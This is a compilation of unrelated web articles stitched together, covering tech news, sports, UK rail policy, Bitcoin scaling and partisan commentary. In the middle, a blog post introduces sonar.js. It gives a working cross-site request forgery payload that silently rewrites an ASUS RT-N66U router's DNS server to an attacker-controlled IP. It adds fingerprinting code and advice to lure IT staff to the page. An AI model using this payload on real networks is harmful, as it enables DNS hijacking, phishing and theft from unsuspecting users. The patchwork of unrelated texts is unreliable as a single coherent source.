Kelly hit the mark when they asked what kind of math Rove was doing. The beauty of math is that two plus two always equals four, no matter your political leanings. We should all start asking whether someone's math is something they do to make themselves feel better or whether it's a calculation that others can replicate.
Kevin Gallo gives the developer perspective on today's Windows 10 Event By Kevin Gallo / Corporate Vice President, Windows Developer Platform Share Share Skype
Did you see the Microsoft Windows 10 Event this morning? Satya, Terry, and Panos talked about some of the exciting new features coming in the Windows 10 Creators Update and announced some amazing new additions to our Surface family of devices. If you missed the event, be sure to check it out here.
As a developer, my first question when I see new features or new hardware is “What can I do with that?” We want to take advantage of the latest and coolest platform capabilities to make our apps more useful and engaging.
There were several announcements today that offer exciting opportunities for Windows developers. Three of these that I want to tell you about are:
3D in Windows 10 along with the first VR headsets capable of mixed reality through the Windows 10 Creators update.
Ability to put the people you care about most at the center of your experience—right where they belong—with Windows MyPeople
Surface Dial, a new input peripheral designed for the creative process that integrates with Windows and is complimentary to other input devices like pen. It gives developers the ability to create unique multi-modal experiences that can be customized based on context. The APIs work in both Universal Windows Platform (UWP) and Win32 apps.
Rather that write a long blog post, I decided to go down to our Channel 9 studios and record a video that gives my thoughts and provides what I hope will be a useful developer perspective on today's announcements. Here's my conversation with Seth Juarez from Channel 9:
My team and I are working hard to finish the platform work that will fully support the Windows 10 Creators Update, but you can start experimenting with many of the things we talked today. Windows Insiders can download the latest flight of the SDK and get started right away.
If you want to dig deeper on the Surface Dial, check out the following links:
Stay tuned to this space for more information in the coming weeks as we get closer to the release of the Windows 10 Creator's update. In the meantime, we always love to hear from you and welcome your feedback at the Windows Developer Feedback site.

sonar.js – A Framework for Scanning and Exploiting Internal Hosts With a Webpage
Recently WebRTC has been in the news as a way to scan internal networks using a regular webpage. We've seen some interesting uses of this functionality such as The New York Times scanning your internal network to detect bots. The idea of a random webpage on the internet being able to scan your internal network for live host is a scary one. What could an attacker do with a list of live hosts on your internal network? It gets a bit scarier when you've experienced pentesting an internal network. Many internal networks are cluttered with devices stocked with default credentials, a list of CVEs that would make Metasploitable look secure, and forgotten devices that were plugged in to never be configured. However, despite WebRTC being a scary feature of many browsers I haven't seen any framework for developing exploits using it.
Introducing sonar.js
In response I built sonar.js, a framework that uses JavaScript, WebRTC, and some onload hackery to detect internal devices on a network. sonar.js works by utilizing WebRTC to enumerate live hosts on the internal network. Upon enumerating a live IP sonar.js then attempts to link to static resources such as CSS, images, and JavaScript whilst hooking the onload event handler. If the resource loads successfully and triggers the onload event then we know that the host has this resource. Why is this useful to know? By getting a list of resources hosted on a device we can attempt to fingerprint what that device is. For example, a Linksys WRT56G router has the following static resources:
/UILinksys.gif
/UI_10.gif
/UI_07.gif
/UI_06.gif
/UI_03.gif
/UI_02.gif
/UI_Cisco.gif
/style.css
So if we embed all of these resources on our page and they return a successful onload event then we can be fairly certain the device is indeed a Linksys WRT54G router. sonar.js automates this process for us and allows penetration testers to build a list of custom exploits for a range of devices, if a device is detected via the methodology above then the appropriate exploit is launched.
Building an Exploit With sonar.js
Now that you know how sonar.js works, let's build a working proof-of-concept with it. For this exercise we are attempting to re-route all requests on an internal network to our own malicious DNS server. Since all of the clients on the network get their DNS settings from the router via the DHCP we'll have to compromise it. In a real attack you would have pre-packaged exploits for multiple different router models but we are just going to build one for the popular ASUS RT-N66U WiFi router. Luckily for us the RT-N66U has no Cross-site Request Forgery protection so we can forge requests for those who are authenticated to the router. The following is an example request to change the router's default DNS server setting (this is the DNS server distributed to all clients on the network):

We now have an exploit for our target router – so how do we integrate this into sonar.js? To start we need to create a sonar.js fingerprint, the following code snippet shows this format:
var fingerprints = [ { 'name': "ASUS RT-N66U", 'fingerprints': ["/images/New_ui/asustitle.png","/images/loading.gif","/images/alertImg.png","/images/New_ui/networkmap/line_one.png","/images/New_ui/networkmap/lock.png","/images/New_ui/networkmap/line_two.png","/index_style.css","/form_style.css","/NM_style.css","/other.css"], 'callback': function( ip ) { // Exploit code here }, }, ]
Since creating a fingerprint by hand can be a pain, I've also created a Chrome extension which will generate one based off of the current page you are on. This is available here:
https://chrome.google.com/webstore/detail/sonar-fingerprint-generat/pmijnndljolchjlfcncaeoejfpjjagef
As we talked about before sonar.js works by linking to static resources on a host to enumerate it. The fingerprints field of the JavaScript object contains an array of static resources we know to exist on every ASUS RT-N66U router. For example, we know that the image /images/New_ui/asustitle.png is part of the main menu for the RT-N66U web UI. Upon enumerating an IP address sonar.js will attempt to link to the above resources while hooking on the onload event handler to check if they loaded successfully. If all the above resources load successfully sonar.js will then call the callback(ip) function to launch the exploit. So, with a small modification to our exploit we have a fully working sonar.js payload:
var fingerprints = [ { 'name': "ASUS RT-N66U", 'fingerprints': ["/images/New_ui/asustitle.png","/images/loading.gif","/images/alertImg.png","/images/New_ui/networkmap/line_one.png","/images/New_ui/networkmap/lock.png","/images/New_ui/networkmap/line_two.png","/index_style.css","/form_style.css","/NM_style.css","/other.css"], 'callback': function( ip ) { var xhr = new XMLHttpRequest(); xhr.open("POST", "http://" + ip + "/start_apply.htm", true); xhr.setRequestHeader("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"); xhr.setRequestHeader("Accept-Language", "en-US,en;q=0.5"); xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded"); xhr.withCredentials = true; var body = "productid=RT-N66U¤t_page=Advanced_DHCP_Content.asp&next_page=Advanced_GWStaticRoute_Content.asp&next_host=" + ip + "&modified=0&action_mode=apply&action_wait=30&action_script=restart_net_and_phy&first_time=&preferred_lang=EN&firmver=3.0.0.4&lan_ipaddr=" + ip + "&lan_netmask=255.255.255.0&dhcp_staticlist=&dhcp_enable_x=1&lan_domain=&dhcp_start=192.168.1.2&dhcp_end=192.168.1.254&dhcp_lease=86400&dhcp_gateway_x=&dhcp_dns1_x=23.92.52.47&dhcp_wins_x=&dhcp_static_x=0&dhcp_staticmac_x_0=&dhcp_staticip_x_0=&FAQ_input="; var aBody = new Uint8Array(body.length); for (var i = 0; i < aBody.length; i++) aBody[i] = body.charCodeAt(i); xhr.send(new Blob([aBody])); }, }, }
We then load this fingerprint database into sonar.js:
<!DOCTYPE html> <html> <head> </head> <body> <script src="sonar.js"></script> <script src="fingerprint_db.js"></script> <script> // Sonar.js loading a fingerprint database from fingerprint_db.js sonar.load_fingerprints( fingerprints ); sonar.start(); </script> </body> </html>
Now we have a working exploit! The next step is to send this payload to our victim. It would be beneficial to target users with router access such as IT staff or system administrators. Upon a user clicking a link to the sonar.js webpage payload the internal network will be scanned for an ASUS RT-N66U router and once it is found the exploit is launched against it.
To show an example of this payload in action, see the following video:
As you can see, we've hijacked all DNS requests on the internal network due to a simple cross-site request forgery vulnerability in the RT-N66U router. Now that we have control over the network's DNS we can redirect requests to things like http://legitbank.com to a phishing page. Suffice to say, when you have control over DNS the game is pretty much over.
The sonar.js Project
We can now build exploits against a range of devices and sonar.js will help us deliver them to internal networks. Currently, the sonar fingerprint database is limited with only a few fingerprints for a few devices. We need your help in expanding this! For more information on generating fingerprints and building exploits with sonar, see the following Github project:
CENTENNIAL, Colo. -- After losing two consecutive road games with an offense that has suddenly gone cold, the Colorado Avalanche expressed confidence Friday they will turn things around Saturday at Pepsi Center against the Minnesota Wild in Game 5 of the best-of-7 Western Conference First Round series (9:30 p.m. ET; CNBC, RDS, TSN, FS-N, ALT).
"We know that we've got some areas to work on and some areas need to get better, but there's no panic in our room," Avalanche captain Gabriel Landeskog said. "We believe in ourselves. It's 2-2 and it's certainly going to be fun from here on. It's not easy to win on the road."
The Avalanche were outshot 78-34 in losing 1-0 in overtime and 2-1 at Xcel Energy Center, where goalie Semyon Varlamov kept them in Games 3 and 4.
"That's your job, stop the puck," said Varlamov, who was named a Vezina Trophy finalist Friday. "Doesn't matter how many shots, 15 or 45. You have to continue to work, continue to just work hard, keep fighting. We knew it was not going to be an easy series for us. It's going to be interesting games coming up. It's not frustration. We've been scoring lots of goals in the season and sometimes you just can't score. It's happened once in a while."
Coach Patrick Roy took exception when asked if the Avalanche "would show up" Saturday after being outplayed in Games 3 and 4.
"We need to be patient with our group," they said, adding that home teams in the Western Conference are 15-1 in the 2014 Stanley Cup Playoffs. "This is a young team, a team, let's not forget, that finished 29th last year. This is a huge step and this is a learning process. I think it's rude to ask are we going to show up. I think we deserve more respect. I'm proud of my team and I'm not going to throw them under the bus because I'm their partner. My glass is half-full.
"Am I satisfied? The answer is no, but let's not forget we're playing against a good team, a team that played really well in their building. Their fans were outstanding and all they did to us is what we did to them. We know we can do better, and we will."
Roy said the Avalanche need to move their feet more, get back to their skating game and start winning 1-on-1 battles that are proving to be grittier than in regular-season play.
"Their defensemen played really well and their goalie (Darcy Kuemper) did a good job not giving too many rebounds, plus we missed the net too many times," Roy said. "Their forecheck was more aggressive than it was in Denver. Where they made a good adjustment is defensive-zone coverage.
"We could make one little adjustment a little different that I think will help us and that's what I'm going to show our guys. Obviously I'm not going to tell you what it is. I think we're right there with them and now it's our turn to put our [courage] on the table."
The Landeskog-Paul Stastny-Nathan MacKinnon line was shut out in Minnesota after combining for seven goals and 10 assists in the first two games. Ryan O'Reilly has two goals and Jamie McGinn has one. The Avalanche haven't gotten a point from the third or fourth line or a goal from a defenseman.
"We have to do a better job of getting the puck out of the zone and getting into the forecheck," Stastny said. "The last few years we've really fed off that forecheck. They jumped on us, and when you're playing in your defensive zone all the time you're just chipping it out and they're getting it right back in. They've done a good job clogging up the neutral zone. We have to do a better job of either coming out right away or have the [defense] bring it back and slow it down and then bring it out and set up the forecheck."
Including Game 2, when Kuemper stopped all 14 shots they faced in relief of Ilya Bryzgalov, the 23-year-old rookie has saved 47 of 48.
"Our offense hasn't done much," Stastny said. "And when we had power plays we didn't really test him. Those are the games, when you're not playing your best and you get four or five power plays, you have to find a way to score and we didn't do that. Last game they won the special teams and that was the difference in the game."
The only power-play goal the Avalanche have in 15 chances came with 14.2 seconds left in Game 2 when Stastny scored into an empty net to seal a 4-2 win. Colorado went 0-for-11 on power plays against Minnesota in five regular-season games.
"That's clearly an issue that's been magnified the last two games," defenseman Erik Johnson said. "It didn't matter when we won the first two games at home, but those things stand out more when you lose."
After leading Avalanche defensemen in regular-season scoring with 39 points (nine goals, 30 assists), Johnson has one assist averaging a team-high 27:04 in ice time against the Wild. Johnson said they and defense partner Jan Hejda have to get more involved in the offense, especially with Tyson Barrie out with a knee injury.
"We're playing the big minutes and all year we've been relied upon to get the job done," they said. "I'd like to add a little more offense than what we've had so far. Games 1 and 2 we had some chances, but the last couple of games there wasn't a ton of room out there and we have to be better in creating that room. For me and Jan we got to be better because we play those big minutes against the top lines. If we're not generating any offense we've got to make sure we're not being scored upon.
"We were feeling good about ourselves when we won those first two games, as we should have. Then we lost the last two games and obviously you're not going to feel great about yourselves losing two in a row. You realize how important your home-ice advantage is. We worked all year for home-ice advantage and hopefully we're going to use that advantage for the better [Saturday]."
Online advertising, visitor tracking and data collection are ubiquitous on the Web as a lot of content and many services are offered for free and providing them costs money.
Users usually appreciate free content and services, but are not fond of many forms of advertising like flash banners or pop-ups. Moreover, privacy and security are concerns. Big companies like Google or Facebook track users across many different sites and gather extensive information about them. Last but not least loading the additional resources to display ads and track visitors makes many Websites terribly slow, especially for mobile users.
Browser extensions like uBlock block many of those ad and tracking requests and display the number of blocked requests. On some pages this number can get offensively high.
I was curious to compare some of the top Websites based on how much blocking is going on and created the chart below that shows the numbers for 50 of the most linked to domains based on the mozRank top 500 listing. I manually collected the numbers browsing the sites in Chrome's incognito mode without being logged in anywhere.
The media sites on top stand out. This should not be a surprise as news sites are often plastered with ads. Only 5 sites have no requests blocked. Wikipedia as expected, statcounter not so much and the URL shorteners goo.gl and t.co merely serve to redirect users.
Facebook and other social networks with low numbers like Twitter, Instagram and Linkedin gather most information from logged-in users.
I was a bit surprised seeing w3.org in the upper third. All of their blocked requests are a result from using piwik for visitor tracking, which I consider completely legitimate.
Operating Websites myself I'm interested to see what content people view and like and think that relevant ads can provide value to users. Nonetheless, I can see that users get annoyed when there are literally more ads than content and want to avoid extensive tracking. Less would probably be more in many cases for both the operators and the users.
If You P2P Download In France: No Internet For You
A pact between the French Government, French ISP's and the local music and film industry will see French users who download material from P2P networks losing their internet access.
French internet users will face three strikes and you're out policy, according to the NY Times. Users will receive a warning for each illegal download before losing their service on the third infringement.
French president Nicolas Sarkozy endorsed the deal with rhetoric that is bound to win them an Honorary Life Membership of both the RIAA and MPAA: “We run the risk of witnessing a genuine destruction of culture…The Internet must not become a high-tech Far West, a lawless zone where outlaws can pillage works with abandon or, worse, trade in them in total impunity. And on whose backs? On artists' backs.”
The Far West of where? Perhaps I'm mistaken in believing that the far East (ie China) is the global hotbed of Internet piracy…or did they mean the wild west? lost in translation perhaps.
An independent authority supervised by a judge will manage the scheme and decide if and when users should lose their internet access.
Not surprisingly the recording and music industry loves the move, with the head of the IFPI (the international recording industry body) John Kennedy telling the Times that “this is the single most important initiative to help win the war on online piracy that we have seen so far..President Sarkozy has shown leadership and vision. They have recognized the importance that the creative industries play in contemporary western economies.”

It was a gift for opponents of the planned HS2 fast rail link connecting London with the Midlands and the north. A suppressed government report showed that the Department for Transport thought the £50bn project was unaffordable given other spending commitments.
This embarrassing finding was sneaked out on the day that the government shunted into the sidings promised upgrades of rail lines in the Midlands and the north. Inevitably, the conclusion drawn was that the delays to the electrification of the London-to-Sheffield and Manchester-to-Leeds lines are the unacceptable price being paid for the mounting cost of HS2, a worthy successor to Concorde in the long list of great British white elephants.
HS2 – why it's time to pull the plug on the fantasy | Letters Read more
In truth, there is no link between Network Rail's failure to deliver on its five-year investment plan and the billions being budgeted for HS2 over the next couple of decades. Not yet, at least. But the cost overruns and the missed targets that have led to the transport secretary Patrick McLoughlin “pausing” the electrification upgrades provide little optimism that HS2 will be brought in on its current budget, or anything like it. And, eventually, that would have an impact on transport spending elsewhere.
Yet, before HS2 is written off as a extravagance Britain can't afford, it is worth putting the case for a new high-speed rail line.
The argument is not about cutting half an hour off journey times for businessmen and women, since they all work on the train anyway. It is not about modernising the nation's rail network, although, given the UK's lowly ranking of 27th in the World Economic Forum's league table for the quality of infrastructure, there is plenty of room for improvement. Opponents of HS2 are not opposed to spending more on the railways: they simply think that the money could be spent better elsewhere, on smaller and less glamorous projects.
It is not even about the way in which the northern regions of England have received disproportionately low levels of transport investment, both in comparison with London and regions in other European countries.
No, the real argument in favour of HS2 is that it could transform the economies of the Midlands and the north, acting as the catalyst for faster growth in the way that a hundred piecemeal projects could not.

This is what might be called the “build it, they will come” approach, named after the film Field of Dreams, in which Kevin Costner builds a baseball stadium in the US midwest because they are convinced the crowds will turn up. They duly arrive.
But that's just Hollywood. Is there any evidence that “build it, they will come” works in the real world? Perhaps surprisingly, there is. A recent study of Berlin during the period 1880-1914 that saw the building of its public transit system found a “mutually dependent relationship between local economic performances on the one hand and transportation supply on the other”.
Put a different way, it wasn't simply the growth of Berlin that led to the development of its public transport system. It was the investment in the public transport system that led to the growth of Berlin.
There are more modern examples of the same phenomenon. Canary Wharf, in what used to be London's docklands, is one. The development around the Guardian's offices in King's Cross, London, is another. A big-bang approach with large-scale investment can lead to rejuvenation and rapid growth.
The economic performance of cities matters. They have higher productivity and lower per-capita carbon dioxide emissions than non-city areas, which means the imperative is to to make cities denser and more easily accessible from surrounding areas.
A report by the consultancy Volterra* found that infrastructure projects can be game changers for both regions and the entire country, but only if there is a re-jigging of the way schemes are evaluated.
“The UK's current appraisal and funding system is based on the assumption that transport investments are made to generate welfare improvements for passengers, rather than to change the economy's output potential. Where change is only incremental it may well be reasonable to consider the economy as being independent of transport in this way. However, where there is the potential for structural economic change, accompanied by major spatial change locally and regionally, this is unlikely to provide a sufficiently full view of likely future transport requirements.
“The changes experienced at Canary Wharf show that past trends are not a useful guide to the future in all circumstances.”
Britain has rarely, if ever, approached infrastructure in this way. There has been no assessment of what is actually needed, no overall vision, no guaranteed long-term funding. Instead, money has been thrown at individual projects for political reasons, capital spending has borne the brunt of cuts to public spending, management has been poor.
The five-year delay in making a decision about airport capacity is an example of economic decisions being coloured by political cowardice; the railways a tribute to the make-do-and-mend approach; the intermittent stretches of dual carriageways on major (non-motorway) roads the result of money running out. The inadequacies of the transport system are a big part of the UK's productivity problem.
Fair enough, opponents of HS2 might say, but that still falls short of a compelling reason for spending £50bn (and the rest) on a railway line, especially since the opportunity cost, upgrades and new investment that won't happen, is potentially high.
That's a reasonable point. The argument for HS2 is that it could provide the catalyst for growth in the Midlands and the north. To that extent, George Osborne is justified in talking about the need for a northern powerhouse.
But it will only work on certain conditions. First, control over transport has to be de-centralised in the way that it is in other countries. It is no accident that the two regions of the UK that have the most local control over transport – London and Scotland – have the highest spending per head.
Second, the management of projects has to be improved – something that a more localised approach should help deliver. Third, HS2 should be built from the north southwards rather than from London northwards. That would both maximise the benefits to the northern regions and bring them forward in time. Fourth, any overruns on HS2 should not result in raids on the rest of the transport infrastructure budget.
Those who see HS2 as just another vanity project will say this is pie in the sky and that the chances of transforming the northern regions lie somewhere between slim and nil. This looks unduly pessimistic. In the right circumstances “build it, they will come” could work. But if HS2 is to be scrapped, it should be scrapped now rather than when billions of pounds have been spent on it.

Popular jailbreak tool Redsn0w – compiled by the iPhone Dev Team – has just been updated with full support for iOS 5.1.1. You may have caught our tutorial, which detailed how one could jailbreak their device tethered using Redsn0w, although since it was a pre-iOS 5.1.1 release, users needed to "point" the tool to the older firmware.
Thanks to the update, though, no download of older firmware is required, and Redsn0w version 0.9.11b4 now fully supports iOS 5.1.1.
The response from the iPhone Dev Team has been a swift one, but we'd expect nothing less from a group of individuals as dedicated and talented as they are. The updates for Redsn0w have been arriving thick and fast of late, and even though no new jailbreaks or iOS versions have arrived for quite some time, the utility has been subject to much housekeeping and performance enhancements.
Of course, the jailbreak is still tethered, and is limited to A4 and below devices only (iPhone 4, iPad 1, iPod touch 4/3G, iPhone 3GS etc), and you can follow the step-by-step how-to tutorial by following our jailbreak 5.1.1 tutorial, keep in mind that you have to skip steps 4, and 7, since Redsn0w now officially supports iOS 5.1.1 and will fetch the needed files on its own.
HDR wasn't performing properly when the camera was initiated by the lock screen button, while AirPlay video playback and Safari bookmark syncing was also causing a few issues to some users, but after downloading and installing iOS 5.1.1, those problems should have disappeared.
It remains to be seen how far away a potential untethered jailbreak may be, and although the likes of I0n1c and Pod2g have made some exciting discoveries on iOS 5.1, and since, in jailbreak terms, iOS 5.1.1 seems to be essentially as you were, the chance of a fully-untethered JB remains possible.
Those running the new 3rd-gen iPad will undoubtedly be the keenest of any iOS user to see a jailbreak, and there are quite a few tweaks which, you feel, would run fantastically on that new Retina display. With a brand new, A5X processor added to the mix, though, it's going to be a tough task, so we'll have to be patient and let the trusted devs do what they do best.
We'll be keeping you up to date with any significant news regarding the JB scene, so stay tuned to our coverage here at Redmond Pie!

For a future Fatbike World Cup
So this is Specialized's answer to Fat Bikes. Check the specs, the price, the geometry, but most importantly the fun. Before riding the fatness, I watched the bike roll out from and into the demo tent with smiling cyclists riding it. On the trail, one of them roared by me and they got raced at the Shortrack race Specialized puts on during the GPL (annual Global Product Launch for media and dealers).
The Fatboy is what I called for in my review of Fat Bikes for Wired – also see the Fat Aftermath. That's where I rode them in the snow and wanted them to perform much better.
The experience made me ponder the point of these bikes, and the questions those building them must answer if snow biking is to catch on….
The Fatboy is what you'd expect from a Spesh MTB with tractor tires: performance geometry and carbon fiber. Mike Sinyard said to me, “doesn't weight too much, huh?!” Nope and it goes good.
Fat and Proud
Like all Spesh bikes, the Fatboy is designed to go fast and this one is just for the fun of it. Owners will likely upgrade the spec to knock a pound or two off and expect an S-Works trim in a generation or two, once races get won on the Fatboy. When they sleep, I think the Spesh product engineers that made this bike dream of a Fatbike World Cup.
At the time of this post, pricing hasn't been announced. See the specs on Specialized's site and talk to your local shop if interested. If the Fatboy sells well, maybe we'll see a Fatboy Turbo, a fat tired version of their other super fun bike. You know their engineers are already dreaming about that too, because it does the same thing as the zoomy Turbo: puts a big grin on your face.
I shot this video with Glass while riding the Fatboy around Copper Mountain.
More photos of the Fatboy are lightboxed on G+ and Flickr.
Supreme Court Justice Sonia Sotomayor encouraged the anti-Donald Trump protesters to keep on protesting Trump in a recent interview.
The Washington Post reports that Sotomayor was being interviewed by Bill Press at the Hill Center on Capitol Hill; Press asked them if they were "apprehensive" about Trump's election to the presidency.
Sotomayor dodged the question by giving encouragement to the protesters.
"I will answer it in a different way, which is I think that this is the time where every good person has an obligation both to continue being heard and to continue doing the right thing," Sotomayor responded. "We can't afford for a president to fail. And it is true … that we have to support that which they do which is right and help guide them to those right decisions.
"But we can't afford to despair, and we can't afford to give up our pursuing of values that we and others have fought so hard to achieve," Sotomayor continued. "And so for me, this is a challenge. So I'm going to continue doing what I think is the right thing. That's the challenge we all have to face."
Sotomayor basically said in a nuanced manner that the protesters need to keep their heads up and continue being heard – blatantly ignoring the fact that the anti-Trump protests have descended into violent riots. Will the media call on Sotomayor to denounce the violence at these riots?
This is par for the course when it comes to Sotomayor. They have been a reliable judicial activist ever since they were confirmed to the Supreme Court. Before then, Sotomayor made statements that fell in line with leftist ideology, such as: "I would hope that a wise Latina woman with the richness of their experiences would more often than not reach a better conclusion than a white male who hasn't lived that life" and the "Court of Appeals is where policy is made."
When they made the latter statement, Sotomayor immediately realized they made a Freudian slip and tried to walk it back by saying they didn't condone it and that the court shouldn't do that, but it was too late: they revealed their judicial activist philosophy:
"This is the time where every good person has an obligation both to continue being heard ..." Supreme Court Justice Sonia Sotomayor
Yet they were still confirmed to the Supreme Court. Now Sotomayor is voicing support to the anti-Trump protests, revealing their partisanship yet again in a position that is not supposed to be political.
If the Phoenix group's project succeeds, it could be a boon to smartphone users seeking another alternative to Google's Android or Apple's iOS.
By day, Matthew Zakutny works as a project manager at a trenchless sewer repair company. By night, he's leading a group of volunteers working to revive a software project that once looked set to challenge the market leaders in the rapidly growing smartphone market.
Phoenix rising?: A group of enthusiasts has developed a version of webOS that runs on the Nexus S smartphone.
Zakutny and their fellow volunteers are hatching a plan to rescue webOS, the mobile operating software initially developed by smartphone pioneer Palm and later offered by HP, by making the software compatible with the latest smartphone hardware.
Calling themselves Phoenix International Communications—a name that references the mythical bird that emerged from the ashes of its predecessor—the group aims to raise enough money to produce and sell a smartphone running an open-source version of webOS perhaps by late 2013.
First released in 2009 on the Palm Pre smartphone, webOS was praised for its intuitive user interface and multitasking tools, including a function that allowed users to see open apps as a stack of on-screen cards that could be closed with a flick or brought to the fore with a tap. Though favorably reviewed by critics, the software never made much headway with consumers, even after Hewlett-Packard purchased a dying Palm for $1.8 billion in 2010 and attempted to resuscitate its mobile products.
HP's mobile-device business, which included webOS, was shut down in late 2011. However, this past September, HP released Open webOS—an open-source version of the software that anyone can use and modify.
Zakutny, who knows some Web design, along with two other fans of the operating system—Marc Edwards, who is well versed in Linux, and Daniel Giovannetti, who is working on the marketing side—decided to band together, hoping that as a group they could bring the software back to life on a new device.
Phoenix's first step is getting webOS to work as an app on existing Android smartphones. (Another group called WebOS Ports is also porting the software to other devices, such as a Samsung Galaxy Nexus tablet.)
The Phoenix team has built an app that does run—albeit extremely slowly—on a Nexus S smartphone, and Zakutny says they expect a faster version of the app to be available through the Google Play Store in about two months (though they won't give specific details about how much of the original webOS functionality the app will provide). The group may offer it for free in the hope that it will get more people interested in webOS, they say.
The group's real goal is to get a phone made that runs webOS natively, in place of Android or another OS. Zakutny says the group is considering using a smaller phone manufacturer in China, and over the next three years it hopes to roll out a low- to mid-range smartphone and then move on to higher-end smartphones if sales take off.
It's a long shot. Phoenix, which is incorporated but run solely by volunteers, hasn't even launched a planned Kickstarter campaign yet. (Zakutny says Phoenix hopes to set a target of $180,000 on the site, though the amount could change as the group works on its Kickstarter application.)
Even if the Phoenix team can get over the hurdles involved in bringing a smartphone to market on a tiny budget, there are hurdles they'll have to surmount on the software side, too. Any new webOS-running device will need a fresh crop of apps. Phoenix hopes to sidestep this issue using OpenMobile, whose technology makes it possible for Android apps to work on non-Android devices. Like webOS, Open webOS incorporates Web programming standards, which is intended to make it easier for Web developers to build apps or port them over to the OS.
The group also wants its device to run an anticipated, but so far unannounced, version of Open webOS from HP known as Open webOS Professional Edition. This is expected to include some cloud-hosted features.
HP is still putting some effort into the open-source software and supporting attempts to bring it to new devices. The first version of Open webOS includes new browser and e-mail applications from HP, and in a statement the company says it is “working closely” with groups like Phoenix and WebOS Ports. HP doesn't specifically refer to Open webOS Professional Edition but says that in the months ahead it will “deliver continued innovation for Open webOS with added functionality that will help us work together with partners to develop a complete solution for end users.”
Ross Rubin, principal analyst at Reticle Research, thinks Phoenix's goal is achievable, given the success some people have had in using crowdfunding sites to raise money for fringe products. But unless the OS offers some radical new capabilities or a major handset maker is willing to support it, they don't expect it to compete with major players.
There is some precedent for left-for-dead tech being brought back to life: the Firefox Web browser, now one of the top browsers, was built from the open-source version of Netscape Communicator, which battled with Microsoft's Internet Explorer in the late 1990s and early 2000s.
Zakutny believes not only that Phoenix can have a device on the market relatively soon but also that there are customers out there, both ardent fans of webOS who refuse to let it go and people who are looking for a new smartphone operating system—such as some of those migrating from Research In Motion's struggling BlackBerry.
“I always tell people we're better than the BlackBerry, because the BlackBerry's not dead yet,” Zakutny says. “We're already dead, so there's nowhere to go but up.”

Update June 2017: The basic concept behind Lerner's SegWit2MB has evolved into “SegWit2x” and an agreement reached by many important industry participants at Consensus 2017 in New York in May. All the arguments for, and my endorsement of, SegWit2MB apply equally to SegWit2x. I am hopeful SegWit2x finally breaks the impasse that has afflicted Bitcoin for 2+ years.

*****
On March 31, Sergio Lerner and the RootStock team proposed “SegWit2MB” to the Bitcoin Core mailing list.
The basics of the proposal…
95% miner support required for consensus
Upon consensus: SegWit is immediately activated 2MB hardfork countdown begins (to occur Dec 14, 2017).
SegWit is Bitcoin Core's version (soft fork). The 2MB hardfork aspect is BIP 102, as coded by Jeff Garzik.
Stated plainly, SegWit2MB is a combination of SegWit and a hard fork to a 2MB base block size cap. The two are tied together such that 95% miner support triggers both.
What's the purpose? In Lerner's words, “Segwit2Mb is the project to merge into Bitcoin a minimal patch that aims to untangle the current conflict between different political positions regarding segwit activation vs. an increase of the on-chain blockchain space through a standard block size increase. It is not a new solution, but it should be seen more as the least common denominator.”
And I'd like to make the case that it should be considered…
Status Quo: A State of Atrophy Nobody Wants
Let's start with some common ground: Bitcoin is immensely important. Can we still agree on that?
Society needs what we're building, not to be forced upon them, but rather offered; a kind and reliable refuge from the tyranny of the world's financial manipulators. That's why many of us are involved. That's why this project got off the ground.
Yet in the six years I've had the pleasure to be involved in this project, there has been a fundamental change in the community. The former friendship among strangers, a rare camaraderie derived from the justness of a great cause, has decayed into conflict. We all see and feel this, and for those of us who truly care about this project, it is miserable. Perhaps many have even forgotten what the community felt like just a few years ago, when the enemy was not ourselves.
Bitcoin suffers now from a 2+ year impasse between angry factions. The anger has grown with the passing months. The cause of this impasse is a fundamental disagreement between large portions of the community (all claiming to be the important majority by one metric or another) over the technical path to scalability on the platform. Both sides have good arguments and bad arguments, and they've all become wound up in a horribly intricate knot. The rhetorical mess has become at least as bad as the underlying technical problem.
Further, the unfortunate context in which this is occurring is one of diminishing utility on the platform: transactions are getting more expensive and less reliable. The user experience of sending a Bitcoin transaction today is worse than it was two years ago. While the price has risen, fundamental utility has actually declined. This is unsustainable, and will be inevitably resolved by utility once again rising, or price declining to meet it.
Do not let yourself be tricked into thinking that the rising price implies fundamental soundness. Prices follow utility, and the latter may fall well before the former realizes it.
At the same time, innovation and growth on other blockchain platforms continues rapidly. This doesn't mean any other blockchain is “better” than Bitcoin, but it does mean other blockchains are improving relatively faster than this one. Again, this will be inevitably resolved by Bitcoin gaining steam once again, or stagnating and awaiting its day in the court of market sentiment. If measurements matter, Bitcoin is at an all-time low in market dominance relative to altcoins. Valuable members of the community have become disillusioned. While new people are always joining Bitcoin as it grows, at the same time some users are leaving partially or in full, preferring other projects that are more exciting to them, or simply less antagonistic.
There is clearly a problem, and we need to fix it. A number of technical solutions have been proposed, but fundamentally while they may fix ills on the technical level, they ignore, dismiss, or worsen ills on the social level. They thus cannot be considered solutions… especially if they aren't happening.
The Hollow Blockchain
Bitcoin is a technical project, absolutely. Yet it is a social project as well. Some readers will scoff at that… but consider that a scoff is an emotional response, which actually proves the point.
Bitcoin, as a technical project, is a brilliant machine, but it is still a machine operated by and among people. Humans, with all their characters and personalities, are the complete benefactors and beneficiaries of this vast abacus. Without the human utility derived, the invention is irrelevant. Without the invention, the human utility is impossible. Indeed, the utility of money itself arises from our social needs; our desire to trade and exchange with each other fairly and without coercion or censorship is the ultimate purpose of Bitcoin. This is social.
To misunderstand Bitcoin as only technical is to dismiss its very purpose and utility. Regardless of the talents one contributes to the project, this truth must be appreciated. Bitcoin is as much social as technical, and always will be. The blockchain stands hollow without our souls attached.
The Cost of Conflict
This current impasse is similarly both technical and social, and it continues at great cost. It slows the growth of the project. It depresses enthusiasm, from which all great art and invention arise… and that art and invention go elsewhere. It invites competition. It signals weakness, and demonstrates disorder. It precludes harmony and the collaborative production of disparate strangers.
And while this is endured, the gears of Bitcoin's true enemies turn slowly, yet they do turn. Bitcoin cannot afford to sit idle in this morass. It does not have the luxury of eternal opportunity. It has a window, and Bitcoin will rise to fill it, or be supplanted by another. If one doesn't care which blockchain brings the utility of honest money to the marketplace, then Bitcoin's situation is of little concern. But if one prefers Bitcoin to fill this role, then the situation is immensely important.
A truth many are not appreciating is that stagnation and replacement are as many threats to Bitcoin's security model as are software glitches and coordinated attackers. Bitcoin has no monopoly on its core virtues: that of storing value without interference, and that of moving value across distance. That it is the best for these today is irrefutable, that it is the best for these tomorrow is assumption.
This assumption cannot be made by prudent caretakers.
